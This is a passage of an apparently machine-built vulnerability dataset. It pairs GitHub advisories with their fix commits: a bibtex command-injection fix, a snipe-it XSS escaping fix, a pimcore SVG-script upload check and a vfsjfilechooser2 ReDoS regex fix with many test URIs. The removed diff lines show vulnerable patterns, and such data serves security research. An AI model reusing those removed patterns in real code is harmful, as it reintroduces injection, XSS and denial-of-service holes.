entries using the sepcified filter (not set by default)\\n       #\\n       def open(path, options = {})\\n-        b = parse(Kernel.open(path, 'r:UTF-8').read, options)\\n+        b = parse(File.read(path), options)\\n         b.path = path\\n         return b unless block_given?\"}}","message_norm":"use file.read instead of kernel.open\n\nto avoid command injection with | strings","language":"en","entities":"[('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/bibtex\/bibliography.rb'])","num_files":1.0},{"index":1495,"vuln_id":"GHSA-c65v-p733-9796","cwe_id":"{'CWE-79'}","score":8.0,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e'}","dataset":"osv","summary":"Cross-site Scripting in snipe\/snipe-it snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2021-11-23","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e","commit_sha":"7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e","patch":"SINGLE","chain_ord":"['7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e']","before_first_fix_commit":"{'e75a5f13ecb77a53d93d67c23e9f1b3580fe8092', 'f7b483358ff114b56c753ee9c2964059a55a3bd2'}","last_fix_commit":"7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e","chain_ord_pos":1.0,"commit_datetime":"11\/16\/2021, 04:33:51","message":"Merge pull request #10315 from snipe\/fixes\/escape_custom_fields_in_api_response\n\nEscape custom field values in API response","author":"snipe","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'app\/Http\/Transformers\/AssetsTransformer.php': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/7ce5993f5ae9d713a0955c2fd8e2dff7a7ce886e\/app%2FHttp%2FTransformers%2FAssetsTransformer.php', 'patch': \"@@ -93,15 +93,15 @@ public function transformAsset(Asset $asset)\\n                     $value = (Gate::allows('superadmin')) ? $decrypted : strtoupper(trans('admin\/custom_fields\/general.encrypted'));\\n \\n                     $fields_array[$field->name] = [\\n-                            'field' => $field->convertUnicodeDbSlug(),\\n-                            'value' => $value,\\n+                            'field' => e($field->convertUnicodeDbSlug()),\\n+                            'value' => e($value),\\n                             'field_format' => $field->format,\\n                         ];\\n \\n                 } else {\\n                     $fields_array[$field->name] = [\\n-                        'field' => $field->convertUnicodeDbSlug(),\\n-                        'value' => $asset->{$field->convertUnicodeDbSlug()},\\n+                        'field' => e($field->convertUnicodeDbSlug()),\\n+                        'value' => e($asset->{$field->convertUnicodeDbSlug()}),\\n                         'field_format' => $field->format,\\n                     ];\\n \\n@@ -134,7 +134,7 @@ public function transformAsset(Asset $asset)\\n                         \\n                             'id' => $component->id,\\n                             'pivot_id' => $component->pivot->id,\\n-                            'name' => $component->name,\\n+                            'name' => e($component->name),\\n                             'qty' => $component->pivot->assigned_qty,\\n                             'price_cost' => $component->purchase_cost,\\n                             'purchase_total' => $component->purchase_cost * $component->pivot->assigned_qty,\"}}","message_norm":"merge pull request #10315 from snipe\/fixes\/escape_custom_fields_in_api_response\n\nescape custom field values in api response","language":"ca","entities":"[('#10315', 'ISSUE', ''), ('escape_custom_fields_in_api_response', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Transformers\/AssetsTransformer.php'])","num_files":1.0},{"index":1497,"vuln_id":"GHSA-c697-r227-pq6h","cwe_id":"{'CWE-434'}","score":7.8,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/35d1853baf64d6a1d90fd8803e52439da53a3911'}","dataset":"osv","summary":"Unrestricted Upload of File with Dangerous Type in pimcore Unrestricted Upload of File with Dangerous Type in Packagist pimcore\/pimcore","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/35d1853baf64d6a1d90fd8803e52439da53a3911","commit_sha":"35d1853baf64d6a1d90fd8803e52439da53a3911","patch":"SINGLE","chain_ord":"['35d1853baf64d6a1d90fd8803e52439da53a3911']","before_first_fix_commit":"{'d8377fc752dc3a42ca72cb49650481191f14ec63'}","last_fix_commit":"35d1853baf64d6a1d90fd8803e52439da53a3911","chain_ord_pos":1.0,"commit_datetime":"01\/17\/2022, 15:52:05","message":"[Settings] Validate SVG uploads for branding","author":"Bernhard Rusch","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/SettingsController.php': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/35d1853baf64d6a1d90fd8803e52439da53a3911\/bundles%2FAdminBundle%2FController%2FAdmin%2FSettingsController.php', 'patch': \"@@ -109,6 +109,12 @@ public function uploadCustomLogoAction(Request $request)\\n             throw new \\\\Exception('Unsupported file format');\\n         }\\n \\n+        if($fileExt === 'svg') {\\n+            if(strpos(file_get_contents($_FILES['Filedata']['tmp_name']), '<script')) {\\n+                throw new \\\\Exception('Scripts in SVG files are not supported');\\n+            }\\n+        }\\n+\\n         $storage = Tool\\\\Storage::get('admin');\\n         $storage->writeStream(self::CUSTOM_LOGO_PATH, fopen($_FILES['Filedata']['tmp_name'], 'rb'));\"}}","message_norm":"[settings] validate svg uploads for branding","language":"sv","entities":"[('validate', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/SettingsController.php'])","num_files":1.0},{"index":1504,"vuln_id":"GHSA-c7fh-chf7-jr5x","cwe_id":"{'CWE-770'}","score":7.5,"chain":"{'https:\/\/github.com\/fracpete\/vfsjfilechooser2\/commit\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b'}","dataset":"osv","summary":"ReDOS in Vfsjfilechooser2 A Regular Expression Denial of Service (ReDOS) vulnerability was discovered in Vfsjfilechooser2 which occurs when the application attempts to validate crafted URIs.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/fracpete\/vfsjfilechooser2","commit_href":"https:\/\/github.com\/fracpete\/vfsjfilechooser2\/commit\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b","commit_sha":"9c9f2c317f3de5ece60a3ae28c371e9796e3909b","patch":"SINGLE","chain_ord":"['9c9f2c317f3de5ece60a3ae28c371e9796e3909b']","before_first_fix_commit":"{'5a5f3487dd44066beb2351a332751932df39973b'}","last_fix_commit":"9c9f2c317f3de5ece60a3ae28c371e9796e3909b","chain_ord_pos":1.0,"commit_datetime":"10\/06\/2020, 21:18:37","message":"incorporated Yeting Li's fix for Potential Regex Denial of Service (ReDoS), see https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7\npasswords can now also contain special characters (eg :), which have to be URL encoded (ie %3A)","author":"Peter Reutemann","comments":null,"stats":"{'additions': 95, 'deletions': 73, 'total': 168}","files":"{'src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java': {'additions': 95, 'deletions': 73, 'changes': 168, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fracpete\/vfsjfilechooser2\/raw\/9c9f2c317f3de5ece60a3ae28c371e9796e3909b\/src%2Fmain%2Fjava%2Fcom%2Fgooglecode%2Fvfsjfilechooser2%2Futils%2FVFSURIValidator.java', 'patch': '@@ -2,6 +2,8 @@\\n  * VFS URIs validator\\n  *\\n  * Copyright (C) 2008 Stan Love\\n+ * Copyright (C) 2020 University of Waikato, Hamilton, NZ\\n+ * Copyright (C) 2020 Yeting Li\\n  *\\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\\n  * you may not use this file except in compliance with the License.\\n@@ -233,11 +235,11 @@ else if ((drive != null) && (file == null)) {\\n \\t\\t\/\/        \"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.*?:.*?@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n \\t\\t\/\/\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n \\t\\tPattern p_ftp2 = Pattern\\n-\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+?\/*)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/.*)\");\\n+\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+?\/*)([ ]*:[0-9]+)*([ ]*:)*(\/.*)\");\\n \\t\\tMatcher m_ftp2 = p_ftp2.matcher(_uri);\\n \\n \\t\\tPattern p_ftp3 = Pattern\\n-\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/*?.*)\");\\n+\\t\\t\\t\\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+)([ \\t]*:[0-9]+)*([ \\t]*:)*(\/*?.*)\");\\n \\t\\tMatcher m_ftp3 = p_ftp3.matcher(_uri);\\n \\n \\t\\tif (m_ftp2.matches()) {\\n@@ -344,6 +346,26 @@ else if ((drive != null) && (file == null)) {\\n \\t\\t\\tif (local_pass.startsWith(\":\")) {\\n \\t\\t\\t\\tlocal_pass = local_pass.substring(1);\\n \\t\\t\\t}\\n+\\t\\t\\t\/\/ decode specials chars (URL encoded %XY)\\n+\\t\\t\\tif (local_pass.contains(\"%\")) {\\n+\\t\\t\\t\\tString tmp_local_pass = local_pass;\\n+\\t\\t\\t\\tStringBuilder new_local_pass = new StringBuilder();\\n+\\t\\t\\t\\twhile (tmp_local_pass.contains(\"%\")) {\\n+\\t\\t\\t\\t\\tnew_local_pass.append(tmp_local_pass.substring(0, tmp_local_pass.indexOf(\\'%\\')));\\n+\\t\\t\\t\\t\\ttmp_local_pass = tmp_local_pass.substring(tmp_local_pass.indexOf(\\'%\\'));\\n+\\t\\t\\t\\t\\tif (tmp_local_pass.length() >= 3) {\\n+\\t\\t\\t\\t\\t\\tchar c = (char) Integer.parseInt(tmp_local_pass.substring(1, 3), 16);\\n+\\t\\t\\t\\t\\t\\tnew_local_pass.append(c);\\n+\\t\\t\\t\\t\\t\\ttmp_local_pass = tmp_local_pass.substring(3);\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\telse {\\n+\\t\\t\\t\\t\\t\\tbreak;\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\tif (!tmp_local_pass.isEmpty())\\n+\\t\\t\\t\\t\\tnew_local_pass.append(tmp_local_pass);\\n+\\t\\t\\t\\tlocal_pass = new_local_pass.toString();\\n+\\t\\t\\t}\\n \\t\\t}\\n \\t\\tlocal_hostname = hostname;\\n \\t\\tlocal_port = port;\\n@@ -823,26 +845,26 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"ftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"ftp:\/\/user:pass%3Aa@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\t\\tv.assertEquals(v.getProtocol(), \"ftp\");\\n \\t\\tv.assertEquals(v.getUser(), \"user\");\\n-\\t\\tv.assertEquals(v.getPassword(), \"pass:\");\\n+\\t\\tv.assertEquals(v.getPassword(), \"pass:a\");\\n \\t\\tv.assertEquals(v.getHostname(), \"machine\");\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"ftp:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"ftp:\/\/user:pass%3A%3a@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\t\\tv.assertEquals(v.getProtocol(), \"ftp\");\\n \\t\\tv.assertEquals(v.getUser(), \"user\");\\n-\\t\\tv.assertEquals(v.getPassword(), \"pass:\");\\n+\\t\\tv.assertEquals(v.getPassword(), \"pass::\");\\n \\t\\tv.assertEquals(v.getHostname(), \"machine\");\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n@@ -992,7 +1014,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"FTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"FTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1004,7 +1026,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"FTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"FTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1161,7 +1183,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1173,7 +1195,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1185,7 +1207,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"sftp: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"sftp: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1197,7 +1219,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"sftp:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1209,7 +1231,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"sftp:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1221,7 +1243,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1233,7 +1255,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1329,7 +1351,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SFTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"SFTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1341,7 +1363,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"SFTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"SFTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1498,7 +1520,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1510,7 +1532,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1522,7 +1544,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"http: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"http: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1534,7 +1556,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"http:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1546,7 +1568,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"http:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1558,7 +1580,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1570,7 +1592,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1666,7 +1688,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1678,7 +1700,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1690,7 +1712,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"HTTP: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"HTTP: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1702,7 +1724,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"HTTP:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1714,7 +1736,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"HTTP:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1726,7 +1748,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1738,7 +1760,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1835,7 +1857,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1847,7 +1869,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1859,7 +1881,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"https: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"https: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1871,7 +1893,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"https:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1883,7 +1905,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"https:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1895,7 +1917,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1907,7 +1929,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2003,7 +2025,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2015,7 +2037,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2027,7 +2049,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"HTTPS: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"HTTPS: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2039,7 +2061,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"HTTPS:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2051,7 +2073,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"HTTPS:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2063,7 +2085,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2075,7 +2097,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) 